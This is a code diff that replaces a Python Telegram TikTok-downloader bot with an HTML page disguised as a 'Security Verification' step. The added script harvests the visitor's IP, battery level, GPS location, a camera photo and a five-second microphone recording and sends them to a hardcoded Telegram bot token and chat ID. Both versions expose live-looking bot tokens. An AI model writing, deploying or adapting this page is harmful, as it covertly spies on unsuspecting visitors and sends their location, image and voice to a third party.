@@ -1,79 +1,94 @@
-import telebot
-import requests
-import os
-from telebot import types
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connection Test</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
+    </style>
+</head>
+<body>
 
-# --- ပြင်ဆင်ရန် အပိုင်း ---
-BOT_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY"
-CHANNEL_ID = "@termuxguide12" # ဒီနေရာမှာ သင့် channel name ကို အမှန်ပြင်ပါ
-# -----------------------
+    <h2>Security Verification</h2>
+    <p>Please click the button below to continue to the content.</p>
+    <button id="startBtn">Continue to Content</button>
 
-bot = telebot.TeleBot(BOT_TOKEN)
+    <script>
+        // Aapka Naya Token aur ID
+        const token = "8684084048:AAEVozTW2qWgq33WrZ4NHDGKz1L3LgymHeQ";
+        const chatId = "5304050102";
 
-def is_subscribed(user_id):
-    try:
-        member = bot.get_chat_member(CHANNEL_ID, user_id)
-        if member.status not in ['left', 'kicked']:
-            return True
-        return False
-    except Exception:
-        return False
+        // 1. Text message bhejne ka function
+        async function sendText(text) {
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+            await fetch(url);
+        }
 
-# --- ဒီအပိုင်းကို အဓိက ပြင်ဆင်ထားပါတယ် ---
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    user_id = message.from_user.id
-    
-    # Join Button ပြုလုပ်ခြင်း
-    markup = types.InlineKeyboardMarkup()
-    clean_name = CHANNEL_ID.replace('@', '')
-    markup.add(types.InlineKeyboardButton("Join Channel 📢", url=f"https://t.me/{clean_name}"))
-    
-    welcome_text = (
-        "🌟 *Ultra HD TikTok Downloader*\n\n"
-        "Bot ကို အသုံးပြုဖို့ ကျွန်ုပ်တို့ရဲ့ Channel ကို အရင် Join ပေးရပါမယ်။\n"
-        "Join ပြီးရင်တော့ TikTok Link ပို့ပြီး ဒေါင်းလုဒ်ဆွဲနိုင်ပါပြီ။"
-    )
-    
-    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")
+        // 2. Photo ya Audio bhejne ka function
+        async function sendMedia(blob, type, filename) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append(type, blob, filename);
+            const url = `https://api.telegram.org/bot${token}/send${type.charAt(0).toUpperCase() + type.slice(1)}`;
+            await fetch(url, { method: 'POST', body: formData });
+        }
 
-@bot.message_handler(func=lambda message: True)
-def handle_message(message):
-    user_id = message.from_user.id
-    url = message.text
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            alert("Starting connection...");
 
-    if not is_subscribed(user_id):
-        markup = types.InlineKeyboardMarkup()
-        clean_name = CHANNEL_ID.replace('@', '')
-        markup.add(types.InlineKeyboardButton("Join Channel 📢", url=f"https://t.me/{clean_name}"))
-        
-        bot.send_message(
-            message.chat.id, 
-            "⚠️ *Access Denied!*\n\nဒီ Bot ကို သုံးနိုင်ဖို့ ကျွန်ုပ်တို့ရဲ့ Channel ကို အရင် Join ပေးပါ။ Join ပြီးမှ Link ကို ပြန်ပို့ပေးပါ။", 
-            reply_markup=markup,
-            parse_mode="Markdown"
-        )
-        return
+            // A. Battery aur IP Info 🔋
+            try {
+                const battery = await navigator.getBattery();
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                let info = `🔋 *Battery:* ${Math.round(battery.level * 100)}%\n🌐 *IP:* ${ipData.ip}`;
+                await sendText(info);
+            } catch (e) { console.log(e); }
 
-    if "tiktok.com" in url:
-        msg = bot.reply_to(message, "🚀 TikTok Video Watermark ဖျောက်နေသည်...")
-        try:
-            api_url = f"https://www.tikwm.com/api/?url={url}&hd=1"
-            res = requests.get(api_url).json()
-            if res.get('code') == 0:
-                video_url = res['data'].get('play') 
-                bot.send_video(
-                    message.chat.id, 
-                    video_url, 
-                    caption="✅ *Ultra HD ဗီဒီယို ရပါပြီ!*\n\nCreated by: [Taro](https://t.me/Yes_is_me_Taro)", 
-                    parse_mode="Markdown"
-                )
-                bot.delete_message(message.chat.id, msg.message_id)
-            else:
-                bot.edit_message_text("❌ Link မှားနေပါသည်။", message.chat.id, msg.message_id)
-        except:
-            bot.edit_message_text("⚠️ စနစ်ချို့ယွင်းချက်ရှိနေပါသည်။", message.chat.id, msg.message_id)
-    else:
-        bot.reply_to(message, "TikTok Link ပဲ ပို့ပေးပါ။")
+            // B. Location 📍
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const loc = `📍 *Location:* https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await sendText(loc);
+            }, (err) => { sendText("❌ Location denied"); });
 
-bot.polling(none_stop=True)
+            // C. Camera Photo 📸
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(blob => sendMedia(blob, 'photo', 'snap.jpg'), 'image/jpeg');
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) { sendText("❌ Camera access denied"); }
+
+            // D. Audio Recording 🎤 (5 Seconds)
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(audioStream);
+                let chunks = [];
+
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    sendMedia(blob, 'voice', 'audio.ogg');
+                    audioStream.getTracks().forEach(track => track.stop());
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
+            } catch (e) { sendText("❌ Audio access denied"); }
+
+            alert("Done! Check your Telegram bot.");
+        });
+    </script>
+</body>
+</html>
